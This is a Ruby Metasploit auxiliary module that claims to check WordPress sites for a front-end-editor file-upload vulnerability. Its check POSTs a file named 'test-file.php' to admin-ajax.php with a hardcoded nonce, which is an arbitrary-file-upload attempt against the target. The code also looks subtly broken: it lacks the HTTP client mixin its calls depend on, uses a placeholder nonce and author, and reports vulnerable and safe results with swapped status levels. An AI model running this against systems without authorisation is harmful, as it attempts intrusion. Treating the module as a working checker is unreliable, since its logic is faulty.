##
# This module tests if a WordPress site is vulnerable to the wp_frontend_editor_file_upload vulnerability.
#
# Reference:
# https://wpvulndb.com/vulnerabilities/10105
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'wp_frontend_editor_file_upload Vulnerability Checker',
      'Description'    => 'Checks if a WordPress site is vulnerable to the wp_frontend_editor_file_upload vulnerability.',
      'Author'         => ['Author Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://wpvulndb.com/vulnerabilities/10105']
      ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the WordPress application', '/'])
    ])
  end

  def run
    begin
      print_status("Connecting to the WordPress site...")
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'method' => 'POST',
        'vars_post' => {
          'action' => 'fep_save',
          'post_id' => 1,
          'nonce' => '123456',
          'attachment' => Rex::Text.encode_base64("This is a test file"),
          'file_name' => 'test-file.php'
        }
      })

      if res and res.code == 200 and res.body.include?('success')
        print_error("The WordPress site is vulnerable to the wp_frontend_editor_file_upload vulnerability.")
      else
        print_good("The WordPress site is not vulnerable to the wp_frontend_editor_file_upload vulnerability.")
      end

    rescue ::Rex::ConnectionError
      print_error("Could not connect to the WordPress site.")
    end
  end

end
